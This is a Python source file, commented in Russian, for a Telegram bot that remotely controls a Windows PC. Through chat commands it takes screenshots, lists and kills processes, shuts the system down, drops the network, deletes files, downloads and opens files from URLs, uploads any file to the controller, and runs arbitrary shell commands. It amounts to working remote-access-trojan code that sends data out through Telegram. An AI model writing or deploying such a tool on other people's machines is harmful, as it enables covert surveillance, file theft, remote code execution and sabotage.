# -*- coding: utf-8 -*-
# бот
import telebot
from telebot import types

# информация
import os, fnmatch
import time
import platform

# скрин
import pyautogui

# Скачать файл
import urllib.request

# Данные пользователя
import config 

bot = telebot.TeleBot(config.TOKEN)

full = [config.urTelegrammId]

@bot.message_handler(commands=['start'])
def start(message):
    try:
        if full.count(message.from_user.id) != 0:
            host = os.getlogin()
            bot.send_message(message.chat.id, f'Бот работает на компьютере - {host}\nСистема: {platform.system()} {platform.release()}')
        else:
            bot.send_message(message.chat.id, f'Доступ заблокирован')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Невозможно узнать информацию.\nПричина - {ex}')

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    try:
        if full.count(message.from_user.id) != 0:
            myScreenshot = pyautogui.screenshot('log.png')
            bot.send_photo(message.chat.id, myScreenshot)
            bot.send_document(message.chat.id, open('log.png',"rb"))
            os.remove('log.png')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Невозможно отправить скриншот.\nПричина - {ex}')


@bot.message_handler(commands=['off'])
def off_pcI(message):
    try:
        if full.count(message.from_user.id) != 0:
            bot.send_message(message.chat.id, f'Выключаем систему {os.getlogin()}')
            os.system('shutdown /s /f /t 0')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Невозможно выключить систему.\nПричина - {ex}')

@bot.message_handler(commands=['proc'])
def proc(message):
    try:
        if full.count(message.from_user.id) != 0:
            tasklist = os.popen('tasklist').read()
            with open("log.txt", "w") as file:
                file.write(tasklist)
            bot.send_document(message.chat.id, open("log.txt", "r"))
            os.remove('log.txt')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка получения процессов.\nПричина - {ex}')
    
@bot.message_handler(commands=['taskkill'])
def taskkill(message):
    try:
        if full.count(message.from_user.id) != 0:
            task = ((message.text).split('/taskkill '))[1]
            os.system(f"taskkill /im {task}")
            bot.send_message(message.chat.id, f'Отправлен сигнал завершения процессу "{task} "')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка.\nПричина - {ex}')
    
    
@bot.message_handler(commands=['iternet_off'])
def internet(message):
    try:
        if full.count(message.from_user.id) != 0:
            os.system('ipconfig/release') 
            bot.send_message(message.chat.id, f'Интернет {os.getlogin()} был отключен')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Не удалось выключить интернет.\nПричина - {ex}')

@bot.message_handler(commands=['delet'])
def delet(message):
    try:
        file = ((message.text).split('/delet '))[1]
        if full.count(message.from_user.id) != 0:
            os.remove(file)
            bot.send_message(message.chat.id, f'Файл удален')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка удаления файла.\nПричина - {ex}')
    
@bot.message_handler(commands=['dir'])
def dir(message):
    try:
        if full.count(message.from_user.id) != 0:
            listOfFiles = os.listdir('.')  
            pattern = "*"  
            print(os.getcwd())
            for entry in listOfFiles:
                if fnmatch.fnmatch(entry, pattern):
                        bot.send_message(message.chat.id, f'{entry}')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Не удалось просмотреть файлы.\nПричина - {ex}')

@bot.message_handler(commands=['cd'])
def cd(message):
    try:
        if full.count(message.from_user.id) != 0:
            path = ((message.text).split('/cd '))[1]
            bot.send_message(message.chat.id, f'{os.getcwd()}')
            os.chdir(path)
    except Exception as ex:
        bot.send_message(message.chat.id, f'Не удалось перейти в директорию.\nПричина - {ex}')
  
@bot.message_handler(commands=['download'])
def downloadfile(message):
    try:
        if full.count(message.from_user.id) != 0:
            full_settings = ((message.text).split('/download '))[1]
            settings = full_settings.split(' ')
            print(full_settings)
            url = f'{settings[0]}'
            destination = f'{settings[1]}'
            urllib.request.urlretrieve(url, destination)
            bot.send_message(message.chat.id, f'Файл скачен\n{destination}')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка скачивания.\nПричина - {ex}')

@bot.message_handler(commands=['open'])
def open_file(message):
    try:
        if full.count(message.from_user.id) != 0:
            patch = ((message.text).split('/open '))[1]
            os.system(patch)
            bot.send_message(message.chat.id, f'Файл открыт\n{patch}')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка открывания файла.\nПричина - {ex}')
        
@bot.message_handler(commands=['get'])
def get_file(message):
    try:
        if full.count(message.from_user.id) != 0:
            patch = ((message.text).split('/get '))[1]
            with open(fr'{patch}', 'rb') as file:
               bot.send_document(message.chat.id, file)
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка получения файла.\nПричина - {ex}')
    
@bot.message_handler(commands=['add_user'])
def add_demo(message):
    try:
        if full.count(message.from_user.id) != 0:
            user_id = ((message.text).split('/add_user '))[1]
            full.append(user_id)
            bot.send_message(message.chat.id, f'{user_id} был добавлен')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка добавления пользователя.\nПричина - {ex}')
        
@bot.message_handler(commands=['cmd'])
def cmd(message):
    try:
        if full.count(message.from_user.id) != 0:
            your_cmd = ((message.text).split('/cmd '))[1]
            os.system(your_cmd)
            bot.send_message(message.chat.id, f'ваша команда {your_cmd} была выполнена')
    except Exception as ex:
        bot.send_message(message.chat.id, f'Ошибка выполнения команды.\nПричина - {ex}')
        
        
@bot.message_handler(commands=['help'])
def help_message(message):
    if full.count(message.from_user.id) != 0:
        msg = """
        Все команды бота:
        /start - Краткая информация о ПК
        /screenshot - Скриншот экрана
        /off - Выключить систему
        /proc - Узнать включенные процессы
        /taskkill [name.exe] - Убить процесс
        /iternet_off - Выключить инет
        /delet [patch] - Удалить файл
        /dir, /cd [patch]- Перейти, посмотреть папку
        /download [url], /open [patch] - Скачать, открыть файл
        /get [patch] - Отправить файл себе
        /add_user [user_id] - добавить нового пользователя
        /cmd [cmd] - Выполняет консольную команду
        """
        bot.send_message(message.chat.id, f'{msg}')
    else:
        bot.send_message(message.chat.id, f'Отказано в доступе')
bot.send_message(config.urTelegrammId, 'Бот работает')
bot.polling(none_stop=True)